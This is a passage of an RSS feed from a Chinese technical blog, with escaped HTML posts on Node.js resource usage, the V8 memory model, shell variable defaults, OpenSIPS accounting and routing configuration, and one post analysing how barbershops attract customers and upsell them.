&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;console.log&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;process.resourceUsage&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/*
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  Will output:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    userCPUTime: 82872,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    systemCPUTime: 4143,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    maxRSS: 33164,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    sharedMemorySize: 0,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    unsharedDataSize: 0,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    unsharedStackSize: 0,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    minorPageFault: 2469,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    majorPageFault: 0,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    swappedOut: 0,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    fsRead: 0,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    fsWrite: 8,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ipcSent: 0,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ipcReceived: 0,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    signalsCount: 0,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    voluntaryContextSwitches: 79,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    involuntaryContextSwitches: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;*/
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>Nodejs Memory Model</title>
      <link>https://wdd.js.org/fe/nodejs-memory-model/</link>
      <pubDate>Wed, 10 Jun 2020 14:21:00 +0800</pubDate>
      <guid>https://wdd.js.org/fe/nodejs-memory-model/</guid>
      <description>&lt;h1 id=&#34;v8内存模型&#34;&gt;v8内存模型&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Code Segment: 代码被实际执行&lt;/li&gt;
&lt;li&gt;Stack
&lt;ul&gt;
&lt;li&gt;本地变量&lt;/li&gt;
&lt;li&gt;指向引用的变量&lt;/li&gt;
&lt;li&gt;流程控制，例如函数&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Heap V8负责管理
&lt;ul&gt;
&lt;li&gt;HeapTotal 堆的总大小&lt;/li&gt;
&lt;li&gt;HeapUsed 实际使用的大小&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Shallow size of an object: 对象自身占用的内存&lt;/li&gt;
&lt;li&gt;Retained size of an object: 对象及其依赖对象删除后回释放的内存&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt=&#34;image.png&#34; loading=&#34;lazy&#34; src=&#34;https://cdn.nlark.com/yuque/0/2020/png/280451/1591769729795-9338d955-8476-4b61-a4aa-b3087bb03c92.png#align=left&amp;display=inline&amp;height=346&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=692&amp;originWidth=838&amp;size=33744&amp;status=done&amp;style=none&amp;width=419&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>解决问题的最后一个思路：拼写错误！！</title>
      <link>https://wdd.js.org/posts/2020/06/ghpbm9/</link>
      <pubDate>Fri, 05 Jun 2020 11:55:40 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/06/ghpbm9/</guid>
      <description>&lt;p&gt;从各种层次排查了问题，包括&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;docker版本不一样&lt;/li&gt;
&lt;li&gt;脚本不一样&lt;/li&gt;
&lt;li&gt;镜像的问题&lt;/li&gt;
&lt;li&gt;&amp;hellip;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;从各种角度排查过后，却发现，问题在是&lt;strong&gt;拼写错误。环境变量没有设置对，导致进程无法前台运行。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;能不拼写就不要拼写！！直接复制。&lt;/p&gt;
&lt;p&gt;大文件在传输图中可能会文件损坏，最好使用md5sum计算文件校验和，然后做对比。&lt;/p&gt;</description>
    </item>
    <item>
      <title>01 手绘风格的流程图</title>
      <link>https://wdd.js.org/posts/2020/06/gbm9n6/</link>
      <pubDate>Fri, 05 Jun 2020 09:31:37 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/06/gbm9n6/</guid>
      <description>&lt;ul&gt;
&lt;li&gt;webrtc的各种demo &lt;a href=&#34;https://webrtc.github.io/samples/&#34;&gt;https://webrtc.github.io/samples/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;在线音频处理 &lt;a href=&#34;https://audiomass.co/&#34;&gt;https://audiomass.co/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;值得深入阅读，关于如何demo的思考 &lt;a href=&#34;https://kitsonkelly.com/posts/deno-is-a-browser-for-code/&#34;&gt;https://kitsonkelly.com/posts/deno-is-a-browser-for-code/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;不错的介绍demo的博客 &lt;a href=&#34;https://kitsonkelly.com/posts&#34;&gt;https://kitsonkelly.com/posts&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;js如何获取音频视频 &lt;a href=&#34;https://www.webdevdrops.com/en/how-to-access-device-cameras-with-javascript/&#34;&gt;https://www.webdevdrops.com/en/how-to-access-device-cameras-with-javascript/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;bats可以用来测试shell脚本 &lt;a href=&#34;https://github.com/bats-core/bats-core&#34;&gt;https://github.com/bats-core/bats-core&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;手绘风格的流程图 &lt;a href=&#34;https://excalidraw.com/&#34;&gt;https://excalidraw.com/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>设置变量默认值</title>
      <link>https://wdd.js.org/shell/default-var/</link>
      <pubDate>Wed, 03 Jun 2020 18:44:33 +0800</pubDate>
      <guid>https://wdd.js.org/shell/default-var/</guid>
      <description>&lt;h2 id=&#34;用法&#34;&gt;用法&lt;/h2&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;Parameter&lt;/th&gt;
          &lt;th&gt;What does it do?&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;${VAR:-STRING}&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;If &lt;code&gt;VAR&lt;/code&gt; is empty or unset, use &lt;code&gt;STRING&lt;/code&gt; as its value.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;${VAR-STRING}&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;If &lt;code&gt;VAR&lt;/code&gt; is unset, use &lt;code&gt;STRING&lt;/code&gt; as its value.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;${VAR:=STRING}&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;If &lt;code&gt;VAR&lt;/code&gt; is empty or unset, set the value of &lt;code&gt;VAR&lt;/code&gt; to &lt;code&gt;STRING&lt;/code&gt;.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;${VAR=STRING}&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;If &lt;code&gt;VAR&lt;/code&gt; is unset, set the value of &lt;code&gt;VAR&lt;/code&gt; to &lt;code&gt;STRING&lt;/code&gt;.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;${VAR:+STRING}&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;If &lt;code&gt;VAR&lt;/code&gt; is not empty, use &lt;code&gt;STRING&lt;/code&gt; as its value.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;${VAR+STRING}&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;If &lt;code&gt;VAR&lt;/code&gt; is set, use &lt;code&gt;STRING&lt;/code&gt; as its value.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;${VAR:?STRING}&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;Display an error if empty or unset.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;${VAR?STRING}&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;Display an error if unset.&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;heading&#34;&gt;&lt;/h1&gt;
&lt;h1 id=&#34;例子&#34;&gt;例子&lt;/h1&gt;
&lt;p&gt;执行下面的例子，如果环境变量中 CONF 的值存在，则取 CONF 的值，否则用默认值 7&lt;/p&gt;</description>
    </item>
    <item>
      <title>理发店的营业模式分析</title>
      <link>https://wdd.js.org/posts/2020/05/frut12/</link>
      <pubDate>Sat, 30 May 2020 20:13:00 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/05/frut12/</guid>
      <description>&lt;h1 id=&#34;1-理发店分类&#34;&gt;1. 理发店分类&lt;/h1&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;类别&lt;/th&gt;
          &lt;th&gt;店面大小&lt;/th&gt;
          &lt;th&gt;并发理发人数&lt;/th&gt;
          &lt;th&gt;业务范围&lt;/th&gt;
          &lt;th&gt;消费者画像&lt;/th&gt;
          &lt;th&gt;定价&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;A(单一理发类)&lt;/td&gt;
          &lt;td&gt;较小&lt;/td&gt;
          &lt;td&gt;4-6&lt;/td&gt;
          &lt;td&gt;理发、染发、烫发&lt;/td&gt;
          &lt;td&gt;学生、普通工人&lt;/td&gt;
          &lt;td&gt;较低&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;B(综合服务类)&lt;/td&gt;
          &lt;td&gt;较大&lt;/td&gt;
          &lt;td&gt;12-20&lt;/td&gt;
          &lt;td&gt;理发、染发、烫发、美容、减肥、刮痧、按摩、脱毛等等&lt;/td&gt;
          &lt;td&gt;白领、老板等有一定经济能力者&lt;/td&gt;
          &lt;td&gt;中上&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;2-如何吸引顾客上门&#34;&gt;2. 如何吸引顾客上门？&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;优惠卡：在理发店营业之前，往往可以以极低的价格，派发理发卡。例如办理20元理发5次这样的理发卡。这样在理发店营业之初，就会有足够的客户上门理发。&lt;/li&gt;
&lt;li&gt;认知偏差：很多理发店会门口挂个横幅: x+x+x 仅需5元。全场套餐仅需1折。其实这些都是吸引顾客的钩子，而真正的前提条件，往往是要办理xxxx元的会员卡。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;3-如何吸引客户更多的消费&#34;&gt;3. 如何吸引客户更多的消费？&lt;/h1&gt;
&lt;p&gt;对于B类理发店来说，一般情况下顾客进店之后，并不会对其立即理发。而需要一位服务员进行理发前的准备，例如头部按摩、颈部刮痧、肩部按摩的放松准备。也可能会上一些茶水，糖果瓜子之类的食品。&lt;/p&gt;
&lt;p&gt;进入理发店，除了有理发的消费之外，还可能纯在其他的消费机会。而消费机会的前提在于**服务人员和顾客之间的沟通。&lt;strong&gt;所以以为能够察言寡色的服务员则显得尤为重要。如果顾客一句话也不说，那也是无法让其更多的消费的。&lt;!-- raw HTML omitted --&gt;&lt;/strong&gt;&lt;!-- raw HTML omitted --&gt;常见的沟通手法如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;发现顾客身上的小瑕疵，进而咨询顾客是否需要专业的人员帮您看看。（注意这一步一定不要立即推荐套餐服务，这样会立即引起顾客的反感情绪。）&lt;/li&gt;
&lt;li&gt;经过专业人员的查看之后，一般会向客户推荐比较优惠的体验一次的项目。因为体验一次往往是话费比较小的。如果上来给客户推荐一两千的套餐，客户一般会拒绝。&lt;/li&gt;
&lt;li&gt;简单的套餐体验过后，可以向顾客推荐套餐，以及如果使用套餐，单次理疗会更加优惠。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;总得理念就是：&lt;strong&gt;循序渐诱，不可操之过急&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&#34;4-如何留住顾客&#34;&gt;4. 如何留住顾客？&lt;/h1&gt;
&lt;p&gt;理发店顾客粘性一般比较小，周围四五家理发店，顾客凭什么再次光顾你这家呢？&lt;/p&gt;
&lt;p&gt;答案就是：&lt;strong&gt;会员卡&lt;/strong&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>acc呼叫记录模块</title>
      <link>https://wdd.js.org/opensips/ch6/acc/</link>
      <pubDate>Fri, 29 May 2020 09:35:43 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch6/acc/</guid>
      <description>&lt;p&gt;opensips 1.x 使用各种flag去设置一个呼叫是否需要记录。从opensips 2.2开始，不再使用flag的方式，而使用 &lt;code&gt;do_accounting()&lt;/code&gt; 函数去标记是否需要记录呼叫。&lt;/p&gt;
&lt;p&gt;注意 do_accounting()函数并不是收到SIP消息后立即写呼叫记录，也仅仅是做一个标记。实际的写数据库或者写日志发生在事务或者dialog完成的时候。&lt;/p&gt;</description>
    </item>
    <item>
      <title>serial_183</title>
      <link>https://wdd.js.org/opensips/ch8/serial-183/</link>
      <pubDate>Thu, 28 May 2020 10:01:57 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch8/serial-183/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-makefile&#34; data-lang=&#34;makefile&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# this example shows how to use forking on failure
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;log_level&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;log_stderror&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;listen&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;192.168.2.16
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# ------------------ module loading ----------------------------------
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#set module path
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;mpath&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/local/lib/opensips/modules/&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Uncomment this if you want to use SQL database
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sl.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;maxfwd.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# -------------------------  request routing logic -------------------
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# main routing logic
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;route{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# initial sanity checks -- messages with
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# max_forwards==0, or excessively long requests&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!mf_process_maxfwd_header&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;10&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;483&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Too Many Hops&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$ml &amp;gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;513&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Message too big&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# skip register for testing purposes&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_methos&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;REGISTER&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;200&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ok&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;INVITE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		seturi&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sip:xxx@192.168.2.16:5064&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# if transaction broken, try other an alternative route&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		t_on_failure&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# if a provisional came, stop alternating&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		t_on_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	t_relay&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;failure_route[1]&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;log(1,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;trying at alternate destination\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;seturi(&amp;#34;sip&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;yyy@192.168.2.16:5064&amp;#34;);
